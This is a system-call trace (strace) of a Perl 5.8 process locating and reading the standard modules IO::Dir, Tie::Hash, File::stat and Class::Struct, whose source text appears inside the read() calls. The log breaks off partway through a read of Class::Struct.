7444  07:18:47.774530 ioctl(6, SNDCTL_TMR_TIMEBASE or TCGETS, 0xbff5d1d8) = -1 ENOTTY (Inappropriate ioctl for device)
7444  07:18:47.774542 _llseek(6, 0, [0], SEEK_CUR) = 0
7444  07:18:47.774561 read(6, "# IO::Dir.pm\n#\n# Copyright (c) 1997-8 Graham Barr <gbarr@pobox.com>. All rights reserved.\n# This program is free software; you can redistribute it and/or\n# modify it under the same terms as Perl itself.\n\npackage IO::Dir;\n\nuse 5.006;\n\nuse strict;\nuse Carp;\nuse Symbol;\nuse Exporter;\nuse IO::File;\nour(@ISA, $VERSION, @EXPORT_OK);\nuse Tie::Hash;\nuse File::stat;\nuse File::Spec;\n\n@ISA = qw(Tie::Hash Exporter);\n$VERSION = \"1.05\";\n$VERSION = eval $VERSION;\n@EXPORT_OK = qw(DIR_UNLINK);\n\nsub DIR_UNLINK () { 1 }\n\nsub new {\n    @_ >= 1 && @_ <= 2 or croak \'usage: new IO::Dir [DIRNAME]\';\n    my $class = shift;\n    my $dh = gensym;\n    if (@_) {\n\tIO::Dir::open($dh, $_[0])\n\t    or return undef;\n    }\n    bless $dh, $class;\n}\n\nsub DESTROY {\n    my ($dh) = @_;\n    closedir($dh);\n}\n\nsub open {\n    @_ == 2 or croak \'usage: $dh->open(DIRNAME)\';\n    my ($dh, $dirname) = @_;\n    return undef\n\tunless opendir($dh, $dirname);\n    # a dir name should always have a \":\" in it; assume dirname is\n    # in current directory\n    $dirname = \':\' .  $dirname if ( ($^O eq \'MacOS\') && ($dirname !~ /:/) );\n    ${*$dh}{io_dir_path} = $dirname;\n    1;\n}\n\nsub close {\n    @_ == 1 or croak \'usage: $dh->close()\';\n    my ($dh) = @_;\n    closedir($dh);\n}\n\nsub read {\n    @_ == 1 or croak \'usage: $dh->read()\';\n    my ($dh) = @_;\n    readdir($dh);\n}\n\nsub seek {\n    @_ == 2 or croak \'usage: $dh->seek(POS)\';\n    my ($dh,$pos) = @_;\n    seekdir($dh,$pos);\n}\n\nsub tell {\n    @_ == 1 or croak \'usage: $dh->tell()\';\n    my ($dh) = @_;\n    telldir($dh);\n}\n\nsub rewind {\n    @_ == 1 or croak \'usage: $dh->rewind()\';\n    my ($dh) = @_;\n    rewinddir($dh);\n}\n\nsub TIEHASH {\n    my($class,$dir,$options) = @_;\n\n    my $dh = $class->new($dir)\n\tor return undef;\n\n    $options ||= 0;\n\n    ${*$dh}{io_dir_unlink} = $options & DIR_UNLINK;\n    $dh;\n}\n\nsub FIRSTKEY {\n    my($dh) = @_;\n    $dh->rewind;\n    scalar $dh->read;\n}\n\nsub NEXTKEY {\n    my($dh) = @_;\n    scalar $dh->read;\n}\n\nsub EXISTS {\n    my($dh,$key) = @_;\n    -e File::Spec->catfile(${*$dh}{io_dir_path}, $key);\n}\n\nsub FETCH {\n    my($dh,$key) = @_;\n    &lstat(File::Spec->catfile(${*$dh}{io_dir_path}, $key));\n}\n\nsub STORE {\n    my($dh,$key,$data) = @_;\n    my($atime,$mtime) = ref($data) ? @$data : ($data,$data);\n    my $file = File::Spec->catfile(${*$dh}{io_dir_path}, $key);\n    unless(-e $file) {\n\tmy $io = IO::File->new($file,O_CREAT | O_RDWR);\n\t$io->close if $io;\n    }\n    utime($atime,$mtime, $file);\n}\n\nsub DELETE {\n    my($dh,$key) = @_;\n\n    # Only unlink if unlink-ing is enabled\n    return 0\n\tunless ${*$dh}{io_dir_unlink};\n\n    my $file = File::Spec->catfile(${*$dh}{io_dir_path}, $key);\n\n    -d $file\n\t? rmdir($file)\n\t: unlink($file);\n}\n\n1;\n\n__END__\n\n=head1 NAME \n\nIO::Dir - supply object methods for directory handles\n\n=head1 SYNOPSIS\n\n    use IO::Dir;\n    $d = IO::Dir->new(\".\");\n    if (defined $d) {\n        while (defined($_ = $d->read)) { something($_); }\n        $d->rewind;\n        while (defined($_ = $d->read)) { something_else($_); }\n        undef $d;\n    }\n\n    tie %dir, \'IO::Dir\', \".\";\n    foreach (keys %dir) {\n\tprint $_, \" \" , $dir{$_}->size,\"\\n\";\n    }\n\n=head1 DESCRIPTION\n\nThe C<IO::Dir> package provides two interfaces to perl\'s directory reading\nroutines.\n\nThe first interface is an object approach. C<IO::Dir> provides an object\nconstructor and methods, which are just wrappers around perl\'s built in\ndirectory reading routines.\n\n=over 4\n\n=item new ( [ DIRNAME ] )\n\nC<new> is the constructor for C<IO::Dir> objects. It accepts one optional\nargument which,  if given, C<new> will pass to C<open>\n\n=back\n\nThe following methods are wrappers for the directory related functions built\ninto perl (the trailing `dir\' has been removed from the names). See L<perlfunc>\nfor details of these functions.\n\n=over 4\n\n=item open ( DIRNAME )\n\n=item read ()\n\n=item seek ( POS )\n\n=item tell ()\n\n=item rewind ()\n\n=item close ()\n\n=back\n\nC<IO::Dir> also provides an interface to reading directories via a tied\nhash. The tied hash extends the interface beyond just the directory\nreading routines by the use of C<lstat>, from the C<File::stat> package,\nC<unlin", 4096) = 4096
7444  07:18:47.775109 stat64("/etc/perl/Tie/Hash.pmc", 0xbff5d00c) = -1 ENOENT (No such file or directory)
7444  07:18:47.775127 stat64("/etc/perl/Tie/Hash.pm", 0xbff5cf1c) = -1 ENOENT (No such file or directory)
7444  07:18:47.775141 stat64("/usr/local/lib/perl/5.8.8/Tie/Hash.pmc", 0xbff5d00c) = -1 ENOENT (No such file or directory)
7444  07:18:47.775153 stat64("/usr/local/lib/perl/5.8.8/Tie/Hash.pm", 0xbff5cf1c) = -1 ENOENT (No such file or directory)
7444  07:18:47.775167 stat64("/usr/local/share/perl/5.8.8/Tie/Hash.pmc", 0xbff5d00c) = -1 ENOENT (No such file or directory)
7444  07:18:47.775180 stat64("/usr/local/share/perl/5.8.8/Tie/Hash.pm", 0xbff5cf1c) = -1 ENOENT (No such file or directory)
7444  07:18:47.775193 stat64("/usr/lib/perl5/Tie/Hash.pmc", 0xbff5d00c) = -1 ENOENT (No such file or directory)
7444  07:18:47.775205 stat64("/usr/lib/perl5/Tie/Hash.pm", 0xbff5cf1c) = -1 ENOENT (No such file or directory)
7444  07:18:47.775218 stat64("/usr/share/perl5/Tie/Hash.pmc", 0xbff5d00c) = -1 ENOENT (No such file or directory)
7444  07:18:47.775229 stat64("/usr/share/perl5/Tie/Hash.pm", 0xbff5cf1c) = -1 ENOENT (No such file or directory)
7444  07:18:47.775242 stat64("/usr/lib/perl/5.8/Tie/Hash.pmc", 0xbff5d00c) = -1 ENOENT (No such file or directory)
7444  07:18:47.775255 stat64("/usr/lib/perl/5.8/Tie/Hash.pm", 0xbff5cf1c) = -1 ENOENT (No such file or directory)
7444  07:18:47.775284 stat64("/usr/share/perl/5.8/Tie/Hash.pmc", 0xbff5d00c) = -1 ENOENT (No such file or directory)
7444  07:18:47.775325 stat64("/usr/share/perl/5.8/Tie/Hash.pm", {st_mode=S_IFREG|0644, st_size=7304, ...}) = 0
7444  07:18:47.775363 open("/usr/share/perl/5.8/Tie/Hash.pm", O_RDONLY|O_LARGEFILE) = 8
7444  07:18:47.775378 ioctl(8, SNDCTL_TMR_TIMEBASE or TCGETS, 0xbff5cd28) = -1 ENOTTY (Inappropriate ioctl for device)
7444  07:18:47.775389 _llseek(8, 0, [0], SEEK_CUR) = 0
7444  07:18:47.775408 read(8, "package Tie::Hash;\n\nour $VERSION = \'1.02\';\n\n=head1 NAME\n\nTie::Hash, Tie::StdHash, Tie::ExtraHash - base class definitions for tied hashes\n\n=head1 SYNOPSIS\n\n    package NewHash;\n    require Tie::Hash;\n\n    @ISA = (Tie::Hash);\n\n    sub DELETE { ... }\t\t# Provides needed method\n    sub CLEAR { ... }\t\t# Overrides inherited method\n\n\n    package NewStdHash;\n    require Tie::Hash;\n\n    @ISA = (Tie::StdHash);\n\n    # All methods provided by default, define only those needing overrides\n    # Accessors access the storage in %{$_[0]};\n    # TIEHASH should return a reference to the actual storage\n    sub DELETE { ... }\n\n    package NewExtraHash;\n    require Tie::Hash;\n\n    @ISA = (Tie::ExtraHash);\n\n    # All methods provided by default, define only those needing overrides\n    # Accessors access the storage in %{$_[0][0]};\n    # TIEHASH should return an array reference with the first element being\n    # the reference to the actual storage \n    sub DELETE { \n      $_[0][1]->(\'del\', $_[0][0], $_[1]); # Call the report writer\n      delete $_[0][0]->{$_[1]};\t\t  #  $_[0]->SUPER::DELETE($_[1])\n    }\n\n\n    package main;\n\n    tie %new_hash, \'NewHash\';\n    tie %new_std_hash, \'NewStdHash\';\n    tie %new_extra_hash, \'NewExtraHash\',\n\tsub {warn \"Doing \\U$_[1]\\E of $_[2].\\n\"};\n\n=head1 DESCRIPTION\n\nThis module provides some skeletal methods for hash-tying classes. See\nL<perltie> for a list of the functions required in order to tie a hash\nto a package. The basic B<Tie::Hash> package provides a C<new> method, as well\nas methods C<TIEHASH>, C<EXISTS> and C<CLEAR>. The B<Tie::StdHash> and\nB<Tie::ExtraHash> packages\nprovide most methods for hashes described in L<perltie> (the exceptions\nare C<UNTIE> and C<DESTROY>).  They cause tied hashes to behave exactly like standard hashes,\nand allow for selective overwriting of methods.  B<Tie::Hash> grandfathers the\nC<new> method: it is used if C<TIEHASH> is not defined\nin the case a class forgets to include a C<TIEHASH> method.\n\nFor developers wishing to write their own tied hashes, the required methods\nare briefly defined below. See the L<perltie> section for more detailed\ndescriptive, as well as example code:\n\n=over 4\n\n=item TIEHASH classname, LIST\n\nThe method invoked by the command C<tie %hash, classname>. Associates a new\nhash instance with the specified class. C<LIST> would represent additional\narguments (along the lines of L<AnyDBM_File> and compatriots) needed to\ncomplete the association.\n\n=item STORE this, key, value\n\nStore datum I<value> into I<key> for the tied hash I<this>.\n\n=item FETCH this, key\n\nRetrieve the datum in I<key> for the tied hash I<this>.\n\n=item FIRSTKEY this\n\nReturn the first key in the hash.\n\n=item NEXTKEY this, lastkey\n\nReturn the next key in the hash.\n\n=item EXISTS this, key\n\nVerify that I<key> exists with the tied hash I<this>.\n\nThe B<Tie::Hash> implementation is a stub that simply croaks.\n\n=item DELETE this, key\n\nDelete the key I<key> from the tied hash I<this>.\n\n=item CLEAR this\n\nClear all values from the tied hash I<this>.\n\n=item SCALAR this\n\nReturns what evaluating the hash in scalar context yields.\n\nB<Tie::Hash> does not implement this method (but B<Tie::StdHash>\nand B<Tie::ExtraHash> do).\n\n=back\n\n=head1 Inheriting from B<Tie::StdHash>\n\nThe accessor methods assume that the actual storage for the data in the tied\nhash is in the hash referenced by C<tied(%tiedhash)>.  Thus overwritten\nC<TIEHASH> method should return a hash reference, and the remaining methods\nshould operate on the hash referenced by the first argument:\n\n  package ReportHash;\n  our @ISA = \'Tie::StdHash\';\n\n  sub TIEHASH  {\n    my $storage = bless {}, shift;\n    warn \"New ReportHash created, stored in $storage.\\n\";\n    $storage\n  }\n  sub STORE    {\n    warn \"Storing data with key $_[1] at $_[0].\\n\";\n    $_[0]{$_[1]} = $_[2]\n  }\n\n\n=head1 Inheriting from B<Tie::ExtraHash>\n\nThe accessor methods assume that the actual storage for the data in the tied\nhash is in the hash referenced by C<(tied(%tiedhash))-E<gt>[0]>.  Thus overwritten\nC<TIEHASH> method should return an array reference with the first\nelement being a hash refer", 4096) = 4096
7444  07:18:47.775710 read(8, "ence, and the remaining methods should operate on the\nhash C<< %{ $_[0]->[0] } >>:\n\n  package ReportHash;\n  our @ISA = \'Tie::ExtraHash\';\n\n  sub TIEHASH  {\n    my $class = shift;\n    my $storage = bless [{}, @_], $class;\n    warn \"New ReportHash created, stored in $storage.\\n\";\n    $storage;\n  }\n  sub STORE    {\n    warn \"Storing data with key $_[1] at $_[0].\\n\";\n    $_[0][0]{$_[1]} = $_[2]\n  }\n\nThe default C<TIEHASH> method stores \"extra\" arguments to tie() starting\nfrom offset 1 in the array referenced by C<tied(%tiedhash)>; this is the\nsame storage algorithm as in TIEHASH subroutine above.  Hence, a typical\npackage inheriting from B<Tie::ExtraHash> does not need to overwrite this\nmethod.\n\n=head1 C<SCALAR>, C<UNTIE> and C<DESTROY>\n\nThe methods C<UNTIE> and C<DESTROY> are not defined in B<Tie::Hash>,\nB<Tie::StdHash>, or B<Tie::ExtraHash>.  Tied hashes do not require\npresence of these methods, but if defined, the methods will be called in\nproper time, see L<perltie>.\n\nC<SCALAR> is only defined in B<Tie::StdHash> and B<Tie::ExtraHash>.\n\nIf needed, these methods should be defined by the package inheriting from\nB<Tie::Hash>, B<Tie::StdHash>, or B<Tie::ExtraHash>. See L<pertie/\"SCALAR\">\nto find out what happens when C<SCALAR> does not exist.\n\n=head1 MORE INFORMATION\n\nThe packages relating to various DBM-related implementations (F<DB_File>,\nF<NDBM_File>, etc.) show examples of general tied hashes, as does the\nL<Config> module. While these do not utilize B<Tie::Hash>, they serve as\ngood working examples.\n\n=cut\n\nuse Carp;\nuse warnings::register;\n\nsub new {\n    my $pkg = shift;\n    $pkg->TIEHASH(@_);\n}\n\n# Grandfather \"new\"\n\nsub TIEHASH {\n    my $pkg = shift;\n    if (defined &{\"${pkg}::new\"}) {\n\twarnings::warnif(\"WARNING: calling ${pkg}->new since ${pkg}->TIEHASH is missing\");\n\t$pkg->new(@_);\n    }\n    else {\n\tcroak \"$pkg doesn\'t define a TIEHASH method\";\n    }\n}\n\nsub EXISTS {\n    my $pkg = ref $_[0];\n    croak \"$pkg doesn\'t define an EXISTS method\";\n}\n\nsub CLEAR {\n    my $self = shift;\n    my $key = $self->FIRSTKEY(@_);\n    my @keys;\n\n    while (defined $key) {\n\tpush @keys, $key;\n\t$key = $self->NEXTKEY(@_, $key);\n    }\n    foreach $key (@keys) {\n\t$self->DELETE(@_, $key);\n    }\n}\n\n# The Tie::StdHash package implements standard perl hash behaviour.\n# It exists to act as a base class for classes which only wish to\n# alter some parts of their behaviour.\n\npackage Tie::StdHash;\n# @ISA = qw(Tie::Hash);\t\t# would inherit new() only\n\nsub TIEHASH  { bless {}, $_[0] }\nsub STORE    { $_[0]->{$_[1]} = $_[2] }\nsub FETCH    { $_[0]->{$_[1]} }\nsub FIRSTKEY { my $a = scalar keys %{$_[0]}; each %{$_[0]} }\nsub NEXTKEY  { each %{$_[0]} }\nsub EXISTS   { exists $_[0]->{$_[1]} }\nsub DELETE   { delete $_[0]->{$_[1]} }\nsub CLEAR    { %{$_[0]} = () }\nsub SCALAR   { scalar %{$_[0]} }\n\npackage Tie::ExtraHash;\n\nsub TIEHASH  { my $p = shift; bless [{}, @_], $p }\nsub STORE    { $_[0][0]{$_[1]} = $_[2] }\nsub FETCH    { $_[0][0]{$_[1]} }\nsub FIRSTKEY { my $a = scalar keys %{$_[0][0]}; each %{$_[0][0]} }\nsub NEXTKEY  { each %{$_[0][0]} }\nsub EXISTS   { exists $_[0][0]->{$_[1]} }\nsub DELETE   { delete $_[0][0]->{$_[1]} }\nsub CLEAR    { %{$_[0][0]} = () }\nsub SCALAR   { scalar %{$_[0][0]} }\n\n1;\n", 4096) = 3208
7444  07:18:47.776325 read(8, "", 4096) = 0
7444  07:18:47.776358 close(8)          = 0
7444  07:18:47.776389 stat64("/etc/perl/File/stat.pmc", 0xbff5d00c) = -1 ENOENT (No such file or directory)
7444  07:18:47.776404 stat64("/etc/perl/File/stat.pm", 0xbff5cf1c) = -1 ENOENT (No such file or directory)
7444  07:18:47.776417 stat64("/usr/local/lib/perl/5.8.8/File/stat.pmc", 0xbff5d00c) = -1 ENOENT (No such file or directory)
7444  07:18:47.776430 stat64("/usr/local/lib/perl/5.8.8/File/stat.pm", 0xbff5cf1c) = -1 ENOENT (No such file or directory)
7444  07:18:47.776444 stat64("/usr/local/share/perl/5.8.8/File/stat.pmc", 0xbff5d00c) = -1 ENOENT (No such file or directory)
7444  07:18:47.776456 stat64("/usr/local/share/perl/5.8.8/File/stat.pm", 0xbff5cf1c) = -1 ENOENT (No such file or directory)
7444  07:18:47.776470 stat64("/usr/lib/perl5/File/stat.pmc", 0xbff5d00c) = -1 ENOENT (No such file or directory)
7444  07:18:47.776481 stat64("/usr/lib/perl5/File/stat.pm", 0xbff5cf1c) = -1 ENOENT (No such file or directory)
7444  07:18:47.776494 stat64("/usr/share/perl5/File/stat.pmc", 0xbff5d00c) = -1 ENOENT (No such file or directory)
7444  07:18:47.776506 stat64("/usr/share/perl5/File/stat.pm", 0xbff5cf1c) = -1 ENOENT (No such file or directory)
7444  07:18:47.776519 stat64("/usr/lib/perl/5.8/File/stat.pmc", 0xbff5d00c) = -1 ENOENT (No such file or directory)
7444  07:18:47.776532 stat64("/usr/lib/perl/5.8/File/stat.pm", 0xbff5cf1c) = -1 ENOENT (No such file or directory)
7444  07:18:47.776545 stat64("/usr/share/perl/5.8/File/stat.pmc", 0xbff5d00c) = -1 ENOENT (No such file or directory)
7444  07:18:47.776557 stat64("/usr/share/perl/5.8/File/stat.pm", {st_mode=S_IFREG|0644, st_size=3372, ...}) = 0
7444  07:18:47.776578 open("/usr/share/perl/5.8/File/stat.pm", O_RDONLY|O_LARGEFILE) = 8
7444  07:18:47.776593 ioctl(8, SNDCTL_TMR_TIMEBASE or TCGETS, 0xbff5cd28) = -1 ENOTTY (Inappropriate ioctl for device)
7444  07:18:47.776604 _llseek(8, 0, [0], SEEK_CUR) = 0
7444  07:18:47.776620 read(8, "package File::stat;\nuse 5.006;\n\nuse strict;\nuse warnings;\n\nour(@EXPORT, @EXPORT_OK, %EXPORT_TAGS);\n\nour $VERSION = \'1.00\';\n\nBEGIN { \n    use Exporter   ();\n    @EXPORT      = qw(stat lstat);\n    @EXPORT_OK   = qw( $st_dev\t   $st_ino    $st_mode \n\t\t       $st_nlink   $st_uid    $st_gid \n\t\t       $st_rdev    $st_size \n\t\t       $st_atime   $st_mtime  $st_ctime \n\t\t       $st_blksize $st_blocks\n\t\t    );\n    %EXPORT_TAGS = ( FIELDS => [ @EXPORT_OK, @EXPORT ] );\n}\nuse vars @EXPORT_OK;\n\n# Class::Struct forbids use of @ISA\nsub import { goto &Exporter::import }\n\nuse Class::Struct qw(struct);\nstruct \'File::stat\' => [\n     map { $_ => \'$\' } qw{\n\t dev ino mode nlink uid gid rdev size\n\t atime mtime ctime blksize blocks\n     }\n];\n\nsub populate (@) {\n    return unless @_;\n    my $stob = new();\n    @$stob = (\n\t$st_dev, $st_ino, $st_mode, $st_nlink, $st_uid, $st_gid, $st_rdev,\n        $st_size, $st_atime, $st_mtime, $st_ctime, $st_blksize, $st_blocks ) \n\t    = @_;\n    return $stob;\n} \n\nsub lstat ($)  { populate(CORE::lstat(shift)) }\n\nsub stat ($) {\n    my $arg = shift;\n    my $st = populate(CORE::stat $arg);\n    return $st if $st;\n\tmy $fh;\n    {\n\t\tlocal $!;\n\t\tno strict \'refs\';\n\t\trequire Symbol;\n\t\t$fh = \\*{ Symbol::qualify( $arg, caller() )};\n\t\treturn unless defined fileno $fh;\n\t}\n    return populate(CORE::stat $fh);\n}\n\n1;\n__END__\n\n=head1 NAME\n\nFile::stat - by-name interface to Perl\'s built-in stat() functions\n\n=head1 SYNOPSIS\n\n use File::stat;\n $st = stat($file) or die \"No $file: $!\";\n if ( ($st->mode & 0111) && $st->nlink > 1) ) {\n     print \"$file is executable with lotsa links\\n\";\n } \n\n use File::stat qw(:FIELDS);\n stat($file) or die \"No $file: $!\";\n if ( ($st_mode & 0111) && $st_nlink > 1) ) {\n     print \"$file is executable with lotsa links\\n\";\n } \n\n=head1 DESCRIPTION\n\nThis module\'s default exports override the core stat() \nand lstat() functions, replacing them with versions that return \n\"File::stat\" objects.  This object has methods that\nreturn the similarly named structure field name from the\nstat(2) function; namely,\ndev,\nino,\nmode,\nnlink,\nuid,\ngid,\nrdev,\nsize,\natime,\nmtime,\nctime,\nblksize,\nand\nblocks.  \n\nYou may also import all the structure fields directly into your namespace\nas regular variables using the :FIELDS import tag.  (Note that this still\noverrides your stat() and lstat() functions.)  Access these fields as\nvariables named with a preceding C<st_> in front their method names.\nThus, C<$stat_obj-E<gt>dev()> corresponds to $st_dev if you import\nthe fields.\n\nTo access this functionality without the core overrides,\npass the C<use> an empty import list, and then access\nfunction functions with their full qualified names.\nOn the other hand, the built-ins are still available\nvia the C<CORE::> pseudo-package.\n\n=head1 BUGS\n\nAs of Perl 5.8.0 after using this module you cannot use the implicit\nC<$_> or the special filehandle C<_> with stat() or lstat(), trying\nto do so leads into strange errors.  The workaround is for C<$_> to\nbe explicit\n\n    my $stat_obj = stat $_;\n\nand for C<_> to explicitly populate the object using the unexported\nand undocumented populate() function with CORE::stat():\n\n    my $stat_obj = File::stat::populate(CORE::stat(_));\n\n=head1 NOTE\n\nWhile this class is currently implemented using the Class::Struct\nmodule to build a struct-like class, you shouldn\'t rely upon this.\n\n=head1 AUTHOR\n\nTom Christiansen\n", 4096) = 3372
7444  07:18:47.777071 stat64("/etc/perl/Class/Struct.pmc", 0xbff5cb5c) = -1 ENOENT (No such file or directory)
7444  07:18:47.777089 stat64("/etc/perl/Class/Struct.pm", 0xbff5ca6c) = -1 ENOENT (No such file or directory)
7444  07:18:47.777103 stat64("/usr/local/lib/perl/5.8.8/Class/Struct.pmc", 0xbff5cb5c) = -1 ENOENT (No such file or directory)
7444  07:18:47.777116 stat64("/usr/local/lib/perl/5.8.8/Class/Struct.pm", 0xbff5ca6c) = -1 ENOENT (No such file or directory)
7444  07:18:47.777130 stat64("/usr/local/share/perl/5.8.8/Class/Struct.pmc", 0xbff5cb5c) = -1 ENOENT (No such file or directory)
7444  07:18:47.777143 stat64("/usr/local/share/perl/5.8.8/Class/Struct.pm", 0xbff5ca6c) = -1 ENOENT (No such file or directory)
7444  07:18:47.777156 stat64("/usr/lib/perl5/Class/Struct.pmc", 0xbff5cb5c) = -1 ENOENT (No such file or directory)
7444  07:18:47.777168 stat64("/usr/lib/perl5/Class/Struct.pm", 0xbff5ca6c) = -1 ENOENT (No such file or directory)
7444  07:18:47.777181 stat64("/usr/share/perl5/Class/Struct.pmc", 0xbff5cb5c) = -1 ENOENT (No such file or directory)
7444  07:18:47.777193 stat64("/usr/share/perl5/Class/Struct.pm", 0xbff5ca6c) = -1 ENOENT (No such file or directory)
7444  07:18:47.777206 stat64("/usr/lib/perl/5.8/Class/Struct.pmc", 0xbff5cb5c) = -1 ENOENT (No such file or directory)
7444  07:18:47.777219 stat64("/usr/lib/perl/5.8/Class/Struct.pm", 0xbff5ca6c) = -1 ENOENT (No such file or directory)
7444  07:18:47.777232 stat64("/usr/share/perl/5.8/Class/Struct.pmc", 0xbff5cb5c) = -1 ENOENT (No such file or directory)
7444  07:18:47.777245 stat64("/usr/share/perl/5.8/Class/Struct.pm", {st_mode=S_IFREG|0644, st_size=20512, ...}) = 0
7444  07:18:47.777278 open("/usr/share/perl/5.8/Class/Struct.pm", O_RDONLY|O_LARGEFILE) = 10
7444  07:18:47.777337 ioctl(10, SNDCTL_TMR_TIMEBASE or TCGETS, 0xbff5c878) = -1 ENOTTY (Inappropriate ioctl for device)
7444  07:18:47.777349 _llseek(10, 0, [0], SEEK_CUR) = 0
7444  07:18:47.777369 read(10, "package Class::Struct;\n\n## See POD after __END__\n\nuse 5.006_001;\n\nuse strict;\nuse warnings::register;\nour(@ISA, @EXPORT, $VERSION);\n\nuse Carp;\n\nrequire Exporter;\n@ISA = qw(Exporter);\n@EXPORT = qw(struct);\n\n$VERSION = \'0.63\';\n\n## Tested on 5.002 and 5.003 without class membership tests:\nmy $CHECK_CLASS_MEMBERSHIP = ($] >= 5.003_95);\n\nmy $print = 0;\nsub printem {\n    if (@_) { $print = shift }\n    else    { $print++ }\n}\n\n{\n    package Class::Struct::Tie_ISA;\n\n    sub TIEARRAY {\n        my $class = shift;\n        return bless [], $class;\n    }\n\n    sub STORE {\n        my ($self, $index, $value) = @_;\n        Class::Struct::_subclass_error();\n    }\n\n    sub FETCH {\n        my ($self, $index) = @_;\n        $self->[$index];\n    }\n\n    sub FETCHSIZE {\n        my $self = shift;\n        return scalar(@$self);\n    }\n\n    sub DESTROY { }\n}\n\nsub import {\n    my $self = shift;\n\n    if ( @_ == 0 ) {\n      $self->export_to_level( 1, $self, @EXPORT );\n    } elsif ( @_ == 1 ) {\n\t# This is admittedly a little bit silly:\n\t# do we ever export anything else than \'struct\'...?\n      $self->export_to_level( 1, $self, @_ );\n    } else {\n      goto &struct;\n    }\n}\n\nsub struct {\n\n    # Determine parameter list structure, one of:\n    #   struct( class => [ element-list ])\n    #   struct( class => { element-list })\n    #   struct( element-list )\n    # Latter form assumes current package name as struct name.\n\n    my ($class, @decls);\n    my $base_type = ref $_[1];\n    if ( $base_type eq \'HASH\' ) {\n        $class = shift;\n        @decls = %{shift()};\n        _usage_error() if @_;\n    }\n    elsif ( $base_type eq \'ARRAY\' ) {\n        $class = shift;\n        @decls = @{shift()};\n        _usage_error() if @_;\n    }\n    else {\n        $base_type = \'ARRAY\';\n        $class = (caller())[0];\n        @decls = @_;\n    }\n\n    _usage_error() if @decls % 2 == 1;\n\n    # Ensure we are not, and will not be, a subclass.\n\n    my $isa = do {\n        no strict \'refs\';\n        \\@{$class . \'::ISA\'};\n    };\n    _subclass_error() if @$isa;\n    tie @$isa, \'Class::Struct::Tie_ISA\';\n\n    # Create constructor.\n\n    croak \"function \'new\' already defined in package $class\"\n        if do { no strict \'refs\'; defined &{$class . \"::new\"} };\n\n    my @methods = ();\n    my %refs = ();\n    my %arrays = ();\n    my %hashes = ();\n    my %classes = ();\n    my $got_class = 0;\n    my $out = \'\';\n\n    $out = \"{\\n  package $class;\\n  use Carp;\\n  sub new {\\n\";\n    $out .= \"    my (\\$class, \\%init) = \\@_;\\n\";\n    $out .= \"    \\$class = __PACKAGE__ unless \\@_;\\n\";\n\n    my $cnt = 0;\n    my $idx = 0;\n    my( $cmt, $name, $type, $elem );\n\n    if( $base_type eq \'HASH\' ){\n        $out .= \"    my(\\$r) = {};\\n\";\n        $cmt = \'\';\n    }\n    elsif( $base_type eq \'ARRAY\' ){\n        $out .= \"    my(\\$r) = [];\\n\";\n    }\n    while( $idx < @decls ){\n        $name = $decls[$idx];\n        $type = $decls[$idx+1];\n        push( @methods, $name );\n        if( $base_type eq \'HASH\' ){\n            $elem = \"{\'${class}::$name\'}\";\n        }\n        elsif( $base_type eq \'ARRAY\' ){\n            $elem = \"[$cnt]\";\n            ++$cnt;\n            $cmt = \" # $name\";\n        }\n        if( $type =~ /^\\*(.)/ ){\n            $refs{$name}++;\n            $type = $1;\n        }\n        my $init = \"defined(\\$init{\'$name\'}) ? \\$init{\'$name\'} :\";\n        if( $type eq \'@\' ){\n            $out .= \"    croak \'Initializer for $name must be array reference\'\\n\"; \n            $out .= \"        if defined(\\$init{\'$name\'}) && ref(\\$init{\'$name\'}) ne \'ARRAY\';\\n\";\n            $out .= \"    \\$r->$elem = $init [];$cmt\\n\"; \n            $arrays{$name}++;\n        }\n        elsif( $type eq \'%\' ){\n            $out .= \"    croak \'Initializer for $name must be hash reference\'\\n\";\n            $out .= \"        if defined(\\$init{\'$name\'}) && ref(\\$init{\'$name\'}) ne \'HASH\';\\n\";\n            $out .= \"    \\$r->$elem = $init {};$cmt\\n\";\n            $hashes{$name}++;\n        }\n        elsif ( $type eq \'$\') {\n            $out .= \"    \\$r->$elem = $init undef;$cmt\\n\";\n        }\n        elsif( $type =~ /^\\w+(?:::\\w+)*$/ ){\n            $out .= \"    if (defined(\\$init{\'$name\'}))", 4096) = 4096
7444  07:18:47.777775 brk(0x82de000)    = 0x82de000
7444  07:18:47.778149 read(10, " {\\n\";\n           $out .= \"       if (ref \\$init{\'$name\'} eq \'HASH\')\\n\";\n            $out .= \"            { \\$r->$elem = $type->new(\\%{\\$init{\'$name\'}}) } $cmt\\n\";\n           $out .= \"       elsif (UNIVERSAL::isa(\\$init{\'$name\'}, \'$type\'))\\n\";\n            $out .= \"            { \\$r->$elem = \\$init{\'$name\'} } $cmt\\n\";\n            $out .= \"       else { croak \'Initializer for $name must be hash or $type reference\' }\\n\";\n            $out .= \"    }\\n\";\n            $classes{$name} = $type;\n            $got_class = 1;\n        }\n        else{\n            croak \"\'$type\' is not a valid struct element type\";\n        }\n        $idx += 2;\n    }\n    $out .= \"    bless \\$r, \\$class;\\n  }\\n\";\n\n    # Create accessor methods.\n\n    my( $pre, $pst, $sel );\n    $cnt = 0;\n    foreach $name (@methods){\n        if ( do { no strict \'refs\'; defined &{$class . \"::$name\"} } ) {\n            warnings::warnif(\"function \'$name\' already defined, overrides struct accessor method\");\n        }\n        else {\n            $pre = $pst = $cmt = $sel = \'\';\n            if( defined $refs{$name} ){\n                $pre = \"\\\\(\";\n                $pst = \")\";\n                $cmt = \" # returns ref\";\n            }\n            $out .= \"  sub $name {$cmt\\n    my \\$r = shift;\\n\";\n            if( $base_type eq \'ARRAY\' ){\n                $elem = \"[$cnt]\";\n                ++$cnt;\n            }\n            elsif( $base_type eq \'HASH\' ){\n                $elem = \"{\'${class}::$name\'}\";\n            }\n            if( defined $arrays{$name} ){\n                $out .= \"    my \\$i;\\n\";\n                $out .= \"    \\@_ ? (\\$i = shift) : return \\$r->$elem;\\n\"; \n                $out .= \"    if (ref(\\$i) eq \'ARRAY\' && !\\@_) { \\$r->$elem = \\$i; return \\$r }\\n\";\n                $sel = \"->[\\$i]\";\n            }\n            elsif( defined $hashes{$name} ){\n                $out .= \"    my \\$i;\\n\";\n                $out .= \"    \\@_ ? (\\$i = shift) : return \\$r->$elem;\\n\";\n                $out .= \"    if (ref(\\$i) eq \'HASH\' && !\\@_) { \\$r->$elem = \\$i; return \\$r }\\n\";\n                $sel = \"->{\\$i}\";\n            }\n            elsif( defined $classes{$name} ){\n                if ( $CHECK_CLASS_MEMBERSHIP ) {\n                    $out .= \"    croak \'$name argument is wrong class\' if \\@_ && ! UNIVERSAL::isa(\\$_[0], \'$classes{$name}\');\\n\";\n                }\n            }\n            $out .= \"   